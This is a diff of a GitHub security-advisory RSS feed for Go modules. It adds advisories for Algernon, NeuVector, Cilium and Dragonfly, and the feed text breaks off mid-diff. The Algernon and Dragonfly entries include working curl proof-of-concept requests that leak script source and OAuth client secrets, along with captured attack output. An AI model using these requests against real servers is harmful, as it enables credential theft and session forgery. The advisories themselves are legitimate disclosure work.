@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-02T19:07:07.382Z</updated>
+    <updated>2026-07-02T20:52:07.633Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,545 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/xyproto/algernon] Algernon vulnerable to server-side script source disclosure on Windows via NTFS filename]]></title>
+        <id>https://github.com/advisories/GHSA-mm6c-5j6x-hq8m</id>
+        <link href="https://github.com/advisories/GHSA-mm6c-5j6x-hq8m"/>
+        <updated>2026-07-02T20:46:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Algernon selects its file handler from <code>filepath.Ext()</code> (engine/handlers.go:134), which does not treat the NTFS-equivalent names <code>x.lua::$DATA</code>, <code>x.lua.</code>, or <code>x.lua </code> as <code>.lua</code>. On Windows, an unauthenticated client appends one of these suffixes to any server-side script on a public path and receives its raw source instead of executed output, leaking embedded secrets such as database credentials and the <code>SetCookieSecret</code> value.</p>
+<p>Linux and macOS hosts are unaffected.</p>
+<h3 id="preconditions">Preconditions</h3>
+<ul>
+<li>Algernon runs on a Windows host (NTFS filesystem).</li>
+<li>The instance serves at least one server-side script (<code>.lua</code>, <code>.tl</code>, <code>.po2</code>, <code>.amber</code>, <code>.frm</code>).</li>
+<li>The script sits on a public path, or no auth backend is configured (<code>--nodb</code>, <code>--simple</code>, or default no-DB).</li>
+<li>HTTP/HTTPS reachability to the server.</li>
+</ul>
+<h3 id="details">Details</h3>
+<pre><code class="language-go">// engine/handlers.go:133
+lowercaseFilename := strings.ToLower(filename)
+ext := filepath.Ext(lowercaseFilename) // "index.lua::$data" -&gt; ".lua::$data", not ".lua"  [offending]
+...
+if ac.dispatchRenderer(w, req, filename, ext) { // ext unrecognised, returns false
+    return
+}
+switch ext {
+case ".lua", ".tl": // execute the script -- never reached for the equivalent forms
+    // ... RunLua ...
+default:
+    // control reaches the raw-file branch below
+}
+</code></pre>
+<pre><code class="language-go">// engine/handlers.go:452
+f, err := os.Open(filename) // NTFS resolves "index.lua::$DATA" to index.lua's data stream
+...
+// engine/handlers.go:479
+if dataBlock, err := ac.ReadAndLogErrors(w, filename, ext); err == nil {
+    dataBlock.ToClient(w, req, filename, ac.ClientCanGzip(req), gzipThreshold) // raw source to client
+}
+</code></pre>
+<p>The request path reaches <code>FilePage</code> through <code>URL2filename</code> (utils/files.go:24), which rejects only <code>..</code>; a <code>:</code>, a trailing <code>.</code>, and a trailing space all pass through into <code>filename</code>. <code>filepath.Ext</code> does an exact suffix match, so <code>.lua::$data</code>, <code>.</code>, and <code>.lua </code> are not equal to <code>.lua</code> or <code>.tl</code>. The renderer registry and the execute case are both skipped and control falls to the <code>default</code> branch.</p>
+<p>The default branch opens <code>filename</code> with <code>os.Open</code> and streams the bytes verbatim. On Windows, NTFS canonicalises the alternate-data-stream suffix <code>::$DATA</code>, a trailing dot, and a trailing space back to the underlying file, so the bytes returned are the real script source. The missing check: Algernon never rejects or canonicalises Windows-equivalent filenames before choosing a handler.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p><strong>Setup</strong></p>
+<ol>
+<li><p>Build Algernon from source on a Windows host:</p>
+<pre><code class="language-powershell">git clone https://github.com/xyproto/algernon
+cd algernon
+git checkout v1.17.8
+go build -o algernon.exe .
+</code></pre>
+</li>
+<li><p>Create a web root with a script that embeds secrets, exactly as a real handler would:</p>
+<pre><code class="language-powershell">New-Item -ItemType Directory webroot | Out-Null
+Set-Content webroot\index.lua @'
+-- db = POSTGRES("postgres://app:S3cr3t@db/prod")
+SetCookieSecret("hardcoded-session-key")
+print("&lt;h1&gt;hello&lt;/h1&gt;")
+'@
+</code></pre>
+</li>
+<li><p>Serve the directory over plain HTTP with no auth backend (run in its own window):</p>
+<pre><code class="language-powershell">.\algernon.exe --httponly --noninteractive --nodb --addr ':8088' --dir .\webroot
+</code></pre>
+</li>
+</ol>
+<p><strong>Exploit</strong></p>
+<ol>
+<li><p>Request the script normally. It executes, and the source is not disclosed:</p>
+<pre><code class="language-powershell">curl.exe -s http://127.0.0.1:8088/index.lua
+</code></pre>
+<p>Expected: <code>&lt;h1&gt;hello&lt;/h1&gt;</code>. The DSN and cookie secret are absent from the response.</p>
+</li>
+<li><p>Request the same script through its NTFS <code>::$DATA</code> stream. Algernon returns the raw source:</p>
+<pre><code class="language-powershell">curl.exe -s --path-as-is 'http://127.0.0.1:8088/index.lua::$DATA'
+</code></pre>
+<p>Expected: HTTP 200, <code>Content-Type: application/octet-stream</code>, body is the verbatim Lua source including <code>SetCookieSecret("hardcoded-session-key")</code> and the Postgres DSN.</p>
+</li>
+<li><p>The trailing-dot and trailing-space forms leak the same source:</p>
+<pre><code class="language-powershell">curl.exe -s --path-as-is 'http://127.0.0.1:8088/index.lua.'
+curl.exe -s --path-as-is 'http://127.0.0.1:8088/index.lua%20'
+</code></pre>
+<p>Expected: identical raw-source response for both.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Confidentiality:</strong> Reads the verbatim source of any public-path server-side script, exposing hardcoded DB credentials, API keys, and <code>SetCookieSecret(...)</code> values.</li>
+<li><strong>Authentication:</strong> A disclosed <code>SetCookieSecret</code> value lets an unauthenticated attacker forge session cookies and log in as any user.</li>
+</ul>
+<h3 id="suggestions-to-fix">Suggestions to fix</h3>
+<blockquote>
+<p><em>This has not been tested - it is illustrative only.</em></p>
+</blockquote>
+<p>Reject request paths whose final segment uses a Windows-equivalent form (alternate data stream, trailing dot, or trailing space) before extension dispatch.</p>
+<pre><code class="language-diff"> func (ac *Config) FilePage(w http.ResponseWriter, req *http.Request, filename, luaDataFilename string) {
++	// Reject Windows filename-equivalent forms that alias a different file
++	// than filepath.Ext sees (e.g. "x.lua::$DATA", "x.lua.", "x.lua ").
++	if base := filepath.Base(filename); strings.ContainsRune(base, ':') ||
++		strings.HasSuffix(base, ".") || strings.HasSuffix(base, " ") {
++		http.NotFound(w, req)
++		return
++	}
+     if ac.quitAfterFirstRequest {
+         go ac.quitSoon("Quit after first request", defaultSoonDuration)
+     }
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/xyproto/algernon/security/advisories/GHSA-mm6c-5j6x-hq8m">https://github.com/xyproto/algernon/security/advisories/GHSA-mm6c-5j6x-hq8m</a></li>
+<li><a href="https://github.com/advisories/GHSA-mm6c-5j6x-hq8m">https://github.com/advisories/GHSA-mm6c-5j6x-hq8m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mm6c-5j6x-hq8m</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-02T20:46:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/neuvector/neuvector] NeuVector process with sensitive arguments lead to leakage]]></title>
+        <id>https://github.com/advisories/GHSA-w54x-xfxg-4gxq</id>
+        <link href="https://github.com/advisories/GHSA-w54x-xfxg-4gxq"/>
+        <updated>2026-07-02T20:27:24.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>When a Java command with password parameters is executed and terminated by NeuVector for Process rule violation. For example, </p>
+<pre><code>java -cp /app ... Djavax.net.ssl.trustStorePassword=&lt;Password&gt;
+</code></pre>
+<p>The command with the password appears in the NeuVector security event. To prevent this, NeuVector uses the following default regular expression to detect and redact sensitive data from process commands:</p>
+<pre><code>(?i)(password|passwd|token)
+</code></pre>
+<p>Also, you can define custom patterns to redact by creating a Kubernetes ConfigMap. For example:</p>
+<pre><code>kubectl create configmap neuvector-custom-rules --from-file=secret-patterns.yaml -n neuvector
+</code></pre>
+<p>Sample <code>secret-patterns.yaml</code> content:</p>
+<pre><code>Pattern_list:
+  - (?i)(pawd|pword)
+  - (?i)(secret)
+</code></pre>
+<p>NeuVector uses the default and custom regex to decide whether the process command in a security event should be redacted.</p>
+<p><strong>Note:</strong> If numerous regular expression (regex) patterns are configured in the Kubernetes ConfigMap for extended coverage of sensitive data matching, it can significantly impact performance of NeuVector enforcer, particularly in scenarios involving large inputs or frequent execution. The primary factor contributing to performance issues in regex is backtracking, where the regex engine attempts various matching paths when a pattern doesn't immediately find a match.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue is fixed in NeuVector version <strong>5.4.6</strong> and later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no workaround. Upgrade to a patched version of NeuVector as soon as possible.</p>
+<h3 id="references">References</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Reach out to the <a href="https://github.com/rancher/rancher/security/policy">SUSE Rancher Security team</a> for security related inquiries.</li>
+<li>Open an issue in the <a href="https://github.com/neuvector/neuvector/issues/new/choose">NeuVector</a> repository.</li>
+<li>Verify with our <a href="https://www.suse.com/suse-neuvector/support-matrix/all-supported-versions/neuvector-v-all-versions/">support matrix</a> and <a href="https://www.suse.com/lifecycle/#suse-security">product support lifecycle</a>.</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/neuvector/neuvector/security/advisories/GHSA-w54x-xfxg-4gxq">https://github.com/neuvector/neuvector/security/advisories/GHSA-w54x-xfxg-4gxq</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-54467">https://nvd.nist.gov/vuln/detail/CVE-2025-54467</a></li>
+<li><a href="https://bugzilla.suse.com/show_bug.cgi?id=CVE-2025-54467">https://bugzilla.suse.com/show_bug.cgi?id=CVE-2025-54467</a></li>
+<li><a href="https://github.com/neuvector/neuvector/commit/f9ddbdf420319cede3c490c1de03f48d953896ae">https://github.com/neuvector/neuvector/commit/f9ddbdf420319cede3c490c1de03f48d953896ae</a></li>
+<li><a href="https://github.com/advisories/GHSA-w54x-xfxg-4gxq">https://github.com/advisories/GHSA-w54x-xfxg-4gxq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w54x-xfxg-4gxq</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-08-28T13:33:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium with misconfigured toGroups in policies can lead to unrestricted egress traffic]]></title>
+        <id>https://github.com/advisories/GHSA-38pp-6gcp-rqvm</id>
+        <link href="https://github.com/advisories/GHSA-38pp-6gcp-rqvm"/>
+        <updated>2026-07-02T20:21:05.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p><code>CiliumNetworkPolicy</code>s which use <code>egress.toGroups.aws.securityGroupsIds</code> to reference AWS security group IDs that do not exist or are not attached to any network interface may unintentionally allow broader outbound access than intended by the policy authors. In such cases, the toCIDRset section of the derived policy is not generated, which means outbound traffic may be permitted to more destinations than originally intended.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue has been patched in:</p>
+<ul>
+<li>Cilium v1.18.4</li>
+<li>Cilium v1.17.10</li>
+<li>Cilium v1.16.17</li>
+</ul>
+<h3 id="this-issue-affects">This issue affects:</h3>
+<ul>
+<li>Cilium v1.18 between v1.18.0 and v1.18.3 inclusive</li>
+<li>Cilium v1.17 between v1.17.0 and v1.17.9 inclusive</li>
+<li>Cilium v1.16.16 and below</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no workaround to this issue.</p>
+<h3 id="acknowledgements">Acknowledgements</h3>
+<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @SeanEmac   for reporting this issue and to @fristonio for the patch.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-38pp-6gcp-rqvm">https://github.com/cilium/cilium/security/advisories/GHSA-38pp-6gcp-rqvm</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64715">https://nvd.nist.gov/vuln/detail/CVE-2025-64715</a></li>
+<li><a href="https://github.com/cilium/cilium/commit/a385856b59c8289cc7273fa3a3062bbf0ef96c97">https://github.com/cilium/cilium/commit/a385856b59c8289cc7273fa3a3062bbf0ef96c97</a></li>
+<li><a href="https://github.com/cilium/cilium/releases/tag/v1.16.17">https://github.com/cilium/cilium/releases/tag/v1.16.17</a></li>
+<li><a href="https://github.com/cilium/cilium/releases/tag/v1.17.10">https://github.com/cilium/cilium/releases/tag/v1.17.10</a></li>
+<li><a href="https://github.com/cilium/cilium/releases/tag/v1.18.4">https://github.com/cilium/cilium/releases/tag/v1.18.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-38pp-6gcp-rqvm">https://github.com/advisories/GHSA-38pp-6gcp-rqvm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-38pp-6gcp-rqvm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-12-01T18:59:54.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium node based network policies may incorrectly allow workload traffic]]></title>
+        <id>https://github.com/advisories/GHSA-c6pf-2v8j-96mc</id>
+        <link href="https://github.com/advisories/GHSA-c6pf-2v8j-96mc"/>
+        <updated>2026-07-02T20:20:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p><a href="https://docs.cilium.io/en/stable/security/policy/language/#node-based">Node based network policies</a> (<code>fromNodes</code> and <code>toNodes</code>) will incorrectly permit traffic to/from non-node endpoints that share the labels specified in <code>fromNodes</code> and <code>toNodes</code> sections of network policies. Node based network policy is disabled by default in Cilium.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue was fixed by <a href="https://github.com/cilium/cilium/pull/36657">https://github.com/cilium/cilium/pull/36657</a>.</p>
+<p>This issue affects:</p>
+<ul>
+<li>Cilium v1.16 between v1.16.0 and v1.16.7 inclusive</li>
+<li>Cilium v1.17 between v1.17.0 and v1.17.1 inclusive</li>
+</ul>
+<p>This issue is fixed in:</p>
+<ul>
+<li>Cilium v1.16.8</li>
+<li>Cilium v1.17.2</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>Users can work around this issue by ensuring that the labels used in <code>fromNodes</code> and <code>toNodes</code> fields are used exclusively by nodes and not by other endpoints.</p>
+<h3 id="acknowledgements">Acknowledgements</h3>
+<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @oblazek  for reporting and fixing this issue.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority. Please also address any comments or questions on this advisory to the same mailing list.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-c6pf-2v8j-96mc">https://github.com/cilium/cilium/security/advisories/GHSA-c6pf-2v8j-96mc</a></li>
+<li><a href="https://github.com/cilium/cilium/pull/36657">https://github.com/cilium/cilium/pull/36657</a></li>
+<li><a href="https://docs.cilium.io/en/stable/security/policy/language/#node-based">https://docs.cilium.io/en/stable/security/policy/language/#node-based</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30163">https://nvd.nist.gov/vuln/detail/CVE-2025-30163</a></li>
+<li><a href="https://github.com/advisories/GHSA-c6pf-2v8j-96mc">https://github.com/advisories/GHSA-c6pf-2v8j-96mc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c6pf-2v8j-96mc</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2025-03-24T19:36:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[d7y.io/dragonfly/v2] Dragonfly Manager OAuth provider client_secret disclosure via unauthenticated GET /api/v1/oauth]]></title>
+        <id>https://github.com/advisories/GHSA-4q9j-6299-gxmr</id>
+        <link href="https://github.com/advisories/GHSA-4q9j-6299-gxmr"/>
+        <updated>2026-07-02T19:21:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The Dragonfly Manager exposes <code>GET /api/v1/oauth</code> and <code>GET /api/v1/oauth/:id</code> to unauthenticated clients. The response body deserializes the entire <code>manager/models.Oauth</code> struct, which includes the <code>client_secret</code> field. Any network-reachable attacker can read the OAuth client secrets configured for <code>github</code> or <code>google</code> providers, defeating the confidentiality guarantee of those secrets and enabling subsequent abuse against the connected identity providers.</p>
+<h3 id="affected-versions">Affected versions</h3>
+<p><code>github.com/dragonflyoss/dragonfly</code> <code>&lt;= v2.4.3</code> (and current <code>main</code> at commit <code>46a8f1e</code>). The vulnerable wiring is present back to the introduction of OAuth GET handlers and was not addressed by GHSA-j8hf-cp34-g4j7 / CVE-2026-24124, whose remediation only added <code>jwt + rbac</code> middleware to the <code>/jobs</code> group.</p>
+<h3 id="privilege-required">Privilege required</h3>
+<p>Unauthenticated. The only precondition is that an administrator has registered at least one OAuth provider via <code>POST /api/v1/oauth</code> (a one-time setup for tenants that enable GitHub / Google sign-in).</p>
+<h3 id="vulnerable-code">Vulnerable code</h3>
+<p><a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/router/router.go#L134-L140"><code>manager/router/router.go:134-140</code></a> (v2.4.3) — the <code>/oauth</code> group registration:</p>
+<pre><code class="language-go">// Oauth.
+oa := apiv1.Group("/oauth")
+oa.POST("", jwt.MiddlewareFunc(), rbac, h.CreateOauth)
+oa.DELETE(":id", jwt.MiddlewareFunc(), rbac, h.DestroyOauth)
+oa.PATCH(":id", jwt.MiddlewareFunc(), rbac, h.UpdateOauth)
+oa.GET(":id", h.GetOauth)
+oa.GET("", h.GetOauths)
+</code></pre>
+<p>Note the asymmetry inside the same <code>oa</code> route group: <code>POST</code>, <code>PATCH</code>, and <code>DELETE</code> explicitly attach <code>jwt.MiddlewareFunc(), rbac</code> as per-route middleware, but the two <code>GET</code> handlers omit both. Compare with the sibling group three lines below at <a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/router/router.go#L143-L148"><code>manager/router/router.go:143-148</code></a>, the <code>/clusters</code> group:</p>
+<pre><code class="language-go">c := apiv1.Group("/clusters", jwt.MiddlewareFunc(), rbac)
+c.POST("", h.CreateCluster)
+c.DELETE(":id", h.DestroyCluster)
+c.PATCH(":id", h.UpdateCluster)
+c.GET(":id", h.GetCluster)
+c.GET("", h.GetClusters)
+</code></pre>
+<p>Here the middleware pair is attached once at the group level, so every verb on <code>/clusters</code> is guarded. The OAuth GETs are an unguarded sibling of the same primitive that GHSA-j8hf-cp34-g4j7 (Jan 2026) patched on the <code>/jobs</code> group. This is <code>sibling-method-dispatch-target</code> of the AP-012 sub-shape lens: same module, same router file, same anchor primitive ("group lacking JWT + RBAC"), parallel GET methods missed.</p>
+<p>The handler at <a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/handlers/oauth.go#L127-L141"><code>manager/handlers/oauth.go:127-141</code></a> returns the model directly:</p>
+<pre><code class="language-go">func (h *Handlers) GetOauth(ctx *gin.Context) {
+    var params types.OauthParams
+    if err := ctx.ShouldBindUri(&amp;params); err != nil {
+        ctx.JSON(http.StatusUnprocessableEntity, gin.H{"errors": err.Error()})
+        return
+    }
+
+    oauth, err := h.service.GetOauth(ctx.Request.Context(), params.ID)
+    if err != nil {
+        ctx.Error(err) // nolint: errcheck
+        return
+    }
+
+    ctx.JSON(http.StatusOK, oauth)
+}
+</code></pre>
+<p><a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/handlers/oauth.go#L155-L171"><code>manager/handlers/oauth.go:155-171</code></a> has the parallel list handler:</p>
+<pre><code class="language-go">func (h *Handlers) GetOauths(ctx *gin.Context) {
+    var query types.GetOauthsQuery
+    if err := ctx.ShouldBindQuery(&amp;query); err != nil {
+        ctx.JSON(http.StatusUnprocessableEntity, gin.H{"errors": err.Error()})
+        return
+    }
+
+    h.setPaginationDefault(&amp;query.Page, &amp;query.PerPage)
+    oauth, count, err := h.service.GetOauths(ctx.Request.Context(), query)
+    if err != nil {
+        ctx.Error(err) // nolint: errcheck
+        return
+    }
+
+    h.setPaginationLinkHeader(ctx, query.Page, query.PerPage, int(count))
+    ctx.JSON(http.StatusOK, oauth)
+}
+</code></pre>
+<p><a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/models/oauth.go#L19-L26"><code>manager/models/oauth.go:19-26</code></a> declares <code>ClientSecret</code> with no <code>json:"-"</code> tag, so it is serialized into every response:</p>
+<pre><code class="language-go">type Oauth struct {
+    BaseModel
+    Name         string `gorm:"column:name;type:varchar(256);index:uk_oauth2_name,unique;not null;comment:oauth2 name" json:"name"`
+    BIO          string `gorm:"column:bio;type:varchar(1024);comment:biography" json:"bio"`
+    ClientID     string `gorm:"column:client_id;type:varchar(256);index:uk_oauth2_client_id,unique;not null;comment:client id for oauth2" json:"client_id"`
+    ClientSecret string `gorm:"column:client_secret;type:varchar(1024);not null;comment:client secret for oauth2" json:"client_secret"`
+    RedirectURL  string `gorm:"column:redirect_url;type:varchar(1024);comment:authorization callback url" json:"redirect_url"`
+}
+</code></pre>
+<h3 id="how-an-unauthenticated-request-reaches-the-oauth-client_secret">How an unauthenticated request reaches the OAuth client_secret</h3>
+<ol>
+<li><code>gin.Engine</code> routes <code>GET /api/v1/oauth/:id</code> to the <code>oa</code> group registered at <a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/router/router.go#L135"><code>manager/router/router.go:135</code></a>. Because no middleware is attached at the group level and none is attached at the per-route level, the request bypasses <code>jwt.MiddlewareFunc()</code> (which would have set or rejected <code>c.Get("id")</code>) and <code>middlewares.RBAC()</code> (which would have called Casbin enforcement).</li>
+<li>The request enters <code>h.GetOauth</code> (<a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/handlers/oauth.go#L127"><code>manager/handlers/oauth.go:127</code></a>), which binds the <code>:id</code> path parameter and calls <code>h.service.GetOauth</code>.</li>
+<li><code>service.GetOauth</code> (<a href="https://github.com/dragonflyoss/dragonfly/blob/e1491bf6134fe307b09e82e11fa94b0587dcd323/manager/service/oauth.go"><code>manager/service/oauth.go</code></a>) does <code>s.db.First(&amp;oauth, id)</code> and returns the populated <code>models.Oauth</code>.</li>
+<li>The handler calls <code>ctx.JSON(http.StatusOK, oauth)</code>. The <code>ClientSecret</code> field is serialized as <code>client_secret</code> in the response body.</li>
+</ol>
+<p>There is no PVR-style validator, no schema filter, no <code>omitempty</code>, and no DTO projection on the way. The audit middleware records the request as <code>actor=unknown</code>.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<pre><code class="language-bash"># (Assume Manager is reachable at $MANAGER and at least one OAuth provider
+#  has been registered via the authenticated POST /api/v1/oauth path.)
+
+curl -s $MANAGER/api/v1/oauth | python3 -m json.tool
+curl -s $MANAGER/api/v1/oauth/1 | python3 -m json.tool
+</code></pre>
+<p>Both calls return <code>HTTP 200</code> with a JSON body that includes <code>client_secret</code>.</p>
+<h3 id="end-to-end-reproduction-against-dragonflyossmanagerv243-on-docker-compose">End-to-end reproduction (against <code>dragonflyoss/manager:v2.4.3</code> on docker compose)</h3>
+<p>Boot the deployment with the project's stock <code>deploy/docker-compose</code> stack reduced to the Manager + its MySQL + Redis dependencies:</p>
+<pre><code class="language-bash">mkdir -p /Users/rick/df2-poc/config
+cp Dragonfly2/deploy/docker-compose/template/manager.template.yaml \
+   /Users/rick/df2-poc/config/manager.yaml
+# replace __IP__ with 127.0.0.1 (advertiseIP) and the redis addr with dragonfly-redis:6379
+# enable the default JWT key line (the template ships it already).
+
+cat &gt; /Users/rick/df2-poc/docker-compose.yaml &lt;&lt;'YAML'
+services:
+  redis:
+    image: redis:6-alpine
+    container_name: dragonfly-redis
+    command: --requirepass dragonfly
+  mysql:
+    image: mariadb:10.6
+    container_name: dragonfly-mysql
+    environment:
+      - MARIADB_USER=dragonfly
+      - MARIADB_PASSWORD=dragonfly
+      - MARIADB_DATABASE=manager
+      - MARIADB_ALLOW_EMPTY_ROOT_PASSWORD=yes
+  manager:
+    image: dragonflyoss/manager:v2.4.3
+    container_name: dragonfly-manager
+    depends_on: [redis, mysql]
+    restart: on-failure
+    volumes:
+      - ./config/manager.yaml:/etc/dragonfly/manager.yaml:ro
+    ports:
+      - "18080:8080"
+YAML
+docker compose -f /Users/rick/df2-poc/docker-compose.yaml up -d
+until curl -fsS -o /dev/null http://localhost:18080/healthy; do sleep 2; done
+</code></pre>
+<p>Bootstrap one administrator and register an OAuth provider whose secret we plant as a sentinel:</p>
+<pre><code class="language-bash"># Sign up + promote to root via the casbin_rule table (no other admin yet).
+curl -s -X POST http://localhost:18080/api/v1/users/signup \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"admin","password":"adminpass123","email":"admin@example.com"}'
+docker exec dragonfly-mysql mysql -uroot -e \
+  "USE manager; INSERT INTO casbin_rule (ptype, v0, v1) VALUES ('g','2','root');"
+docker compose -f /Users/rick/df2-poc/docker-compose.yaml restart manager
+until curl -fsS -o /dev/null http://localhost:18080/healthy; do sleep 2; done
+
+TOKEN=$(curl -s -X POST http://localhost:18080/api/v1/users/signin \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"admin","password":"adminpass123"}' \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')
+
+curl -s -X POST http://localhost:18080/api/v1/oauth \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"name":"github","client_id":"FAKE_CLIENT_ID_abc123",
+       "client_secret":"FAKE_CLIENT_SECRET_supersensitive_xyz789"}'
+</code></pre>
+<p>Captured run output of the actual attack (unauthenticated client):</p>
+<pre><code>=== [0] Baseline: /api/v1/clusters demands auth ===
+HTTP 401
+=== [1] Baseline: /api/v1/jobs demands auth (post GHSA-j8hf fix) ===
+HTTP 401
+
+=== [ATTACK A] Unauthenticated GET /api/v1/oauth -&gt; secret leaks ===
+HTTP 200
+[
+    {
+        "id": 1,
+        "name": "github",
+        "client_id": "FAKE_CLIENT_ID_abc123",
+        "client_secret": "FAKE_CLIENT_SECRET_supersensitive_xyz789",
+        "redirect_url": ""
+    }
+]
+
+=== [ATTACK B] Unauthenticated GET /api/v1/oauth/1 -&gt; secret leaks ===
+HTTP 200
+{
+    "id": 1,
+    "name": "github",
+    "client_id": "FAKE_CLIENT_ID_abc123",
+    "client_secret": "FAKE_CLIENT_SECRET_supersensitive_xyz789",
+    "redirect_url": ""
+}
+</code></pre>
+<p>Interpretation: <code>/api/v1/clusters</code> and <code>/api/v1/jobs</code> both reject the unauthenticated curl with <code>401 Unauthorized</code> (the JWT + RBAC stack engages). The OAuth GETs return <code>200 OK</code> plus the full row including <code>client_secret</code>. The Manager's own RBAC enforcement that exists for every other admin resource is bypassed for these two routes.</p>
+<p>Fix verification (after applying the patch in the next section), the same harness must return <code>401 Unauthorized</code> for both attack steps.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>The OAuth sign-in feature is <code>not actually used in practice within the Dragonfly project itself</code>.</li>
+<li>Unauthenticated disclosure of OAuth <code>client_secret</code> for GitHub / Google providers. A <code>client_secret</code> permits an attacker to mint OAuth tokens against the configured IdP for arbitrary callback URLs (subject to the provider's redirect-URI allowlist on that client), to impersonate the Manager during the OAuth handshake, and to construct phishing pages that look identical to the Manager's own redirect URL.</li>
+<li>The same row also exposes <code>client_id</code> and <code>redirect_url</code>, both of which are useful for a follow-up account-takeover against any Manager user who relies on the OAuth sign-in flow.</li>
+<li>Tenants who exposed the Manager's REST port (<code>8080/tcp</code>, default in the project's <code>docker-compose.yaml</code> and Helm chart) to a corporate network or the internet leak the secret to every host that can reach the port. Network-policy or ingress filtering does not mitigate this for in-cluster attackers.</li>
+</ul>
+<p>CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) compounded by CWE-306 (Missing Authentication for Critical Function).</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Move the JWT and RBAC middleware to the route-group level, matching every other admin resource in the same file (<code>/clusters</code>, <code>/scheduler-clusters</code>, <code>/seed-peers</code>, <code>/configs</code>, <code>/jobs</code> after GHSA-j8hf, etc.). Additionally, drop <code>ClientSecret</code> from any read response by marking it <code>json:"-"</code> on the model, so even a future router regression cannot leak it.</p>
+<pre><code class="language-diff">--- a/manager/router/router.go
++++ b/manager/router/router.go
+@@ Oauth.
+-    oa := apiv1.Group("/oauth")
+-    oa.POST("",   jwt.MiddlewareFunc(), rbac, h.CreateOauth)
